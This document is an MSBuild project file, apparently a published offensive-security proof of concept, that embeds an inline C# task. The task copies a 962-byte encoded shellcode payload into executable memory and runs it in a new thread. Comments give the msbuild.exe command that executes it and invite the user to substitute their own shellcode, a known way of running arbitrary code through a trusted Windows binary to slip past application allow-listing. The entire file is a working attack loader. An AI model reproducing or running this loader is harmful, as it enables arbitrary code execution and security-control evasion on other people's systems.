<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[962] { 0xda,0xd8,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0xea,0xbf,0x25,0x9f,0xca,0x7e,0x83,0xc2,0x04,0x31,0x7a,0x16,0x03,0x7a,0x16,0xe2,0xd0,0x42,0x0c,0xa7,0x6e,0x59,0x65,0xe0,0x52,0x27,0xc2,0xa3,0x31,0x19,0x04,0x72,0x21,0x68,0xd5,0x62,0xaa,0xc8,0xce,0x0f,0x9b,0xb4,0x55,0x48,0x9e,0x22,0xf1,0x4a,0x05,0x05,0x5d,0xf0,0xd4,0x04,0x3b,0x90,0x26,0x72,0xb7,0x28,0xf5,0x1a,0xdc,0x5f,0x0c,0x55,0x15,0x01,0xf1,0x58,0x6b,0x50,0x5a,0xf5,0x12,0x67,0xb1,0x01,0x5f,0x29,0x46,0xdd,0x44,0x3a,0x68,0x7b,0xf0,0x92,0x4f,0xc3,0x7f,0xb8,0xbd,0x9d,0x33,0x1e,0x2a,0xd2,0x1c,0x7a,0x23,0x54,0xa2,0x03,0xc5,0x09,0x7a,0xc8,0xf8,0x6c,0xbd,0xc9,0x39,0x5c,0xa7,0x3a,0xbb,0xa5,0xa2,0x48,0x88,0xf9,0xc6,0x48,0xd9,0x62,0x71,0x4e,0x0c,0xbb,0x14,0xe0,0x3d,0x13,0x9b,0xd1,0x26,0x7c,0x4d,0x33,0x52,0x53,0x50,0xc6,0x26,0x10,0x12,0x89,0xdc,0xf3,0xce,0x2b,0x97,0x34,0x4b,0xdb,0xa5,0x92,0x0c,0x16,0x79,0xd7,0xdd,0x5b,0x50,0x7c,0xd6,0xbb,0xad,0xd4,0x6c,0x31,0xdb,0x6f,0x51,0x60,0x42,0x4d,0xa1,0x95,0x7d,0x1a,0x54,0x66,0x7d,0xbc,0x0e,0x1c,0x83,0x3c,0xd7,0x99,0x55,0x27,0xd5,0x7b,0x0c,0xf6,0x99,0xd3,0x6a,0x5b,0xb9,0x12,0x6f,0xc6,0x01,0x60,0xf3,0xe4,0x92,0xe6,0x81,0x91,0x03,0x31,0x5e,0xba,0x7c,0xe5,0xb2,0xd7,0xd2,0xc8,0x3d,0x95,0xf3,0x33,0x1f,0xbb,0x7b,0x9f,0x6d,0x59,0xd5,0xba,0xdd,0x3b,0xba,0x6b,0x94,0x04,0x9e,0x52,0x95,0x81,0x38,0x2b,0x70,0x7a,0xe4,0x65,0x65,0x94,0x07,0x64,0xbb,0x89,0x1b,0x18,0xb8,0x69,0x15,0x9e,0x1d,0xff,0xd4,0x44,0x88,0x13,0x58,0x91,0x69,0x2f,0x58,0x46,0xff,0x00,0x8c,0x6d,0xb5,0x14,0x20,0x21,0x58,0x46,0x10,0x46,0x56,0xaa,0xc1,0x13,0xda,0xaa,0xed,0x78,0xfb,0x35,0x0a,0x67,0x1e,0x7c,0x19,0x9c,0xee,0xe3,0x70,0x3d,0xbf,0x61,0x4f,0x42,0xaf,0xe4,0x7a,0x6a,0x65,0x18,0x4e,0x0c,0x5a,0x5e,0xed,0xd5,0x52,0x1d,0x39,0x74,0x12,0xc8,0x51,0xe2,0x4c,0x67,0x30,0x5b,0x67,0x4c,0xc8,0xc0,0x7d,0xcc,0xb8,0x4d,0x84,0x01,0xe7,0x38,0x9e,0xc5,0xa6,0x28,0x5b,0x57,0x94,0xda,0x9d,0xed,0x2b,0x97,0x0f,0xff,0xf8,0x72,0xa8,0x02,0x98,0xa4,0xfe,0xd6,0xda,0xe5,0x43,0x85,0x0d,0x70,0x5e,0x9f,0x8a,0xcd,0x5a,0xcd,0x01,0x32,0x43,0x3c,0xbe,0x8e,0x4d,0x15,0x0a,0x8f,0xe5,0x58,0xe8,0xf5,0xa3,0x28,0x9e,0xba,0x62,0x1b,0xc7,0x4e,0xe8,0x75,0x88,0xed,0xe9,0x82,0x60,0xd7,0xb5,0xc4,0x2e,0x9c,0x7d,0xa5,0xc6,0x77,0x57,0x69,0x1e,0x7d,0xac,0x63,0x1c,0x72,0xea,0xa0,0xe6,0xcc,0xcf,0x71,0x70,0x1e,0x64,0xfa,0x2e,0x0e,0xd5,0x53,0x56,0x93,0x99,0xec,0xa5,0x74,0x92,0x8d,0xf3,0x5f,0x57,0x5e,0xf3,0x25,0xb6,0xa3,0xf3,0xda,0x2e,0x17,0x36,0x73,0xb6,0x5a,0x94,0x90,0xa3,0xf2,0xbd,0xbf,0x9d,0x17,0xd4,0xcd,0x1d,0x9f,0xa0,0xa4,0x68,0xce,0x07,0xc8,0x1d,0x25,0x37,0xf0,0x02,0x14,0x7b,0xd9,0x56,0x88,0x7f,0x04,0x8e,0x3d,0x16,0xbd,0xf2,0x5e,0x03,0xde,0x90,0x5d,0x0c,0x7e,0x69,0xcb,0x0b,0x2a,0x8e,0x17,0x52,0x38,0x37,0x9b,0xa3,0x23,0x52,0xf8,0xd6,0x69,0x72,0xfb,0x78,0xea,0xd7,0xc9,0x60,0xb0,0x0c,0x77,0x7a,0x1d,0x34,0xae,0x75,0x16,0x90,0x1c,0x6c,0xeb,0x7f,0xb8,0x5d,0xd7,0xcd,0x52,0xb7,0x37,0x2a,0x3d,0x17,0xc3,0xf4,0x07,0x87,0x75,0xd0,0x82,0x6b,0x3f,0x0f,0xe7,0xe3,0xe5,0xf8,0x40,0xb0,0x11,0x9b,0x9e,0xe0,0xb0,0xa4,0x64,0x7f,0xcc,0xa7,0x3b,0x6f,0xf4,0x2d,0x5e,0x8e,0x1d,0xa1,0x15,0xea,0x56,0x68,0x38,0x96,0xbf,0xf5,0x49,0x20,0x3b,0x91,0xc0,0x0d,0x1f,0xa3,0xa6,0x71,0x25,0x7d,0xd9,0xe4,0xfa,0x46,0xc1,0x7e,0xcd,0x2c,0xe7,0x35,0x52,0x6d,0xf3,0x25,0x78,0xb6,0x78,0xf1,0x28,0x28,0x5d,0x94,0x00,0x53,0xd5,0x3e,0x59,0xb5,0x70,0xf5,0xf5,0xcf,0xa0,0x5a,0x80,0x48,0xf8,0x8a,0x76,0x85,0x87,0x02,0x91,0x9b,0xf9,0x70,0xcc,0xe8,0x67,0x79,0x9f,0x79,0x48,0xc5,0xe4,0xa6,0x06,0xc7,0x57,0x23,0xb7,0x87,0xe2,0x6a,0x2e,0xda,0x52,0xf6,0x0a,0xaf,0x0a,0x3c,0x90,0x58,0x6f,0xd9,0xf3,0x34,0x98,0x6c,0x0e,0x0a,0x04,0x99,0x34,0xc5,0x41,0x19,0xbb,0x38,0x01,0x02,0xc4,0x35,0xf1,0x73,0xb2,0xfb,0xe8,0x1e,0x34,0x82,0x3c,0xa8,0xff,0x4e,0x37,0x9d,0xb5,0x70,0x5e,0x64,0x05,0xdc,0xf3,0x82,0xff,0x45,0xa4,0xaf,0xc3,0x2d,0x06,0xe6,0xd3,0xf1,0x79,0x0f,0x70,0x9f,0xfe,0x8b,0xab,0x1a,0xc0,0x6e,0x8f,0x2d,0xd0,0xdb,0x92,0xb1,0x13,0x35,0xbb,0x24,0x75,0x98,0x61,0xbb,0xc4,0x37,0xc2,0x0a,0x2b,0x69,0x30,0x18,0x8a,0x24,0x11,0xa1,0x82,0x93,0xbd,0xbc,0x22,0xe7,0x2c,0xb9,0x84,0xd6,0x73,0xd8,0x7d,0x99,0x4c,0x9c,0x35,0x2f,0xdc,0x2f,0x6c,0xc0,0x08,0x12,0x48,0xc2,0x06,0x94,0xc0,0x4c,0xb6,0x84,0x37,0xad,0x8e,0xdd,0x6c,0xbe,0x49,0xc9,0x06,0x4a,0x4d,0x8a,0x0e,0x8c,0x78,0xd2,0x7f,0x03,0x9d,0x1f,0x2b,0xf1,0xdf,0xdd,0xdc,0x69,0x79,0x77,0x45,0xe2,0x15,0xff,0x04,0xd3,0xaa,0x99,0xad,0xdb,0x63,0xd7,0x72,0x45,0x08,0x5a,0xef,0x27,0x74,0xc7,0x1a,0x8e,0x70,0x3a,0x5a,0xaf,0xfe,0xfc,0xc8,0x8b,0x3a,0x3d,0x67,0xd2,0x1f,0x14,0x98,0xa5,0xd6,0xdc,0xc8,0xbe,0x70,0xbd,0xbb,0xd7,0x25,0x4e,0x37,0x69,0xe4,0x6b,0x58,0x7c,0xec,0x2f,0x1a,0xec,0x4a,0x83,0xe8,0x65,0x0e,0xea,0x38,0x7d,0x9a,0x2e,0xc9,0xbd,0x38,0x13,0xc2,0x8f,0xc0,0x70,0xf7,0x70,0x03,0x62,0xf8,0xf1,0x3f,0x55,0x5e,0x98,0x8d,0x8b,0xdb,0x2b,0x69,0xce,0x0d,0x63,0x99,0x73,0x64,0x98,0x6d,0xf9,0x1b,0x93,0x09,0x81,0x6f,0x50,0x1c,0x8e,0x0a,0xf3,0x70,0x92,0x9b,0x45,0x50,0xe7,0x7f,0x57,0x8b,0xf7,0x2f };
			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>